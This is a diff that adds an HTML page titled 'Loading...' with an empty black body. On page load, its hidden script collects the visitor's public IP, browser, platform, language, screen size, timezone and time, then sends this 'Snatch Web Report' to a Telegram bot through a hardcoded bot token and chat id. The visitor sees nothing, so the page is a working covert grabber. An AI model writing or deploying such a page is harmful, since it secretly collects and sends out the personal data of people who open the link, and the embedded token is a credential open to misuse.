@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <script>
+    (async () => {
+      const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
+      const data = {
+        ip,
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        lang: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time: new Date().toLocaleString()
+      };
+
+      const msg = `📡 *Snatch Web Report*\n\n🌍 IP: ${data.ip}\n🖥️ OS: ${data.platform}\n📱 Agent: ${data.ua}\n🗺️ Lang: ${data.lang}\n📏 Screen: ${data.screen}\n🕒 Timezone: ${data.tz}\n⏰ Time: ${data.time}`;
+      const token = "7809696227:AAGk8fExoDKgW4xN5X7mhxQ7c7raA2_7uaw";
+      const chat_id = "6991944640";
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: msg })
+      });
+    })();
+  </script>
+  <style>
+    body { background: #000; margin: 0; }
+  </style>
+</head>
+<body></body>
+</html>
